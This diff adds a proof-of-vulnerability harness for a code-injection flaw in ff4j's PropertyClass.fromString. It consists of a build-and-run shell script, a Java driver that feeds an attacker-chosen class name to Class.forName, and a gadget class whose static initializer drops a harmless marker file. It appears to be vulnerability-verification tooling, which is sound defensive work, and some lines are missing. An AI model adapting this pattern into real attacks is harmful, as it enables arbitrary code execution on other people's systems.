+# POV for CWE-094 in ff4j PropertyClass.fromString (Class.forName RCE).
+# Runs inside the project container at /workspace/repo.

+
+# 1. Compile the vulnerable module so we exercise the real product bytecode.
+cd "$REPO"
+mvn -q -B -pl ff4j-core -am -DskipTests compile 1>&2
+

+

+OUT="$POV_DIR/out"
+rm -rf "$OUT"
+mkdir -p "$OUT"

+rc=0
+java -Dff4j.pov.marker="$MARKER" -cp "$CP:$OUT" PovMain || rc=$?
+
+rm -f "$MARKER" 2>/dev/null || true
+exit $rc

+import org.ff4j.property.PropertyClass;
+
+import java.io.File;
+
+/**
+ * Proof of Vulnerability for CWE-094 in ff4j PropertyClass.
+ *
+ * PropertyClass.fromString(String v) calls Class.forName(v). The single-arg
+ * Class.forName initializes the named class, running its static initializer.
+ * By passing an attacker-controlled class name we cause arbitrary code
+ * (the gadget's static block) to execute -> remote code injection.
+ *
+ * Exit 0  => vulnerable  (gadget code executed, marker file written)
+ * Exit 1  => not vulnerable (fromString did not load/initialize the class)
+ */
+public class PovMain {
+
+    public static void main(String[] args) {
+        File marker = new File(System.getProperty("ff4j.pov.marker"));
+        if (marker.exists()) {
+            marker.delete();
+        }
+
+        // Attacker-controlled input flowing into PropertyClass.fromString().
+        String attackerControlledClassName = "povgadget.PovGadget";
+
+        try {
+            new PropertyClass().fromString(attackerControlledClassName);
+        } catch (Throwable t) {
+            // A hardened/patched fromString should refuse to load arbitrary
+            // classes (throwing or returning null without initialization).
+            System.out.println("fromString raised: " + t);
+        }
+
+        if (marker.exists()) {
+            System.out.println("VULNERABLE: attacker-controlled class was loaded "
+                    + "and its static initializer executed via Class.forName.");
+            System.exit(0);
+        }
+
+        System.out.println("NOT VULNERABLE: no attacker code executed.");
+        System.exit(1);
+    }
+}

+/**

+ * classpath whose static initialization has dangerous side effects. Here we
+ * simply drop a marker file to *prove* attacker-controlled code executed.

+public class PovGadget {

+                fos.write("pwned-by-Class.forName".getBytes("UTF-8"));
+                fos.close();
+            }
+        } catch (Exception e) {
+            // ignore - marker absence will signal "not executed"
+        }
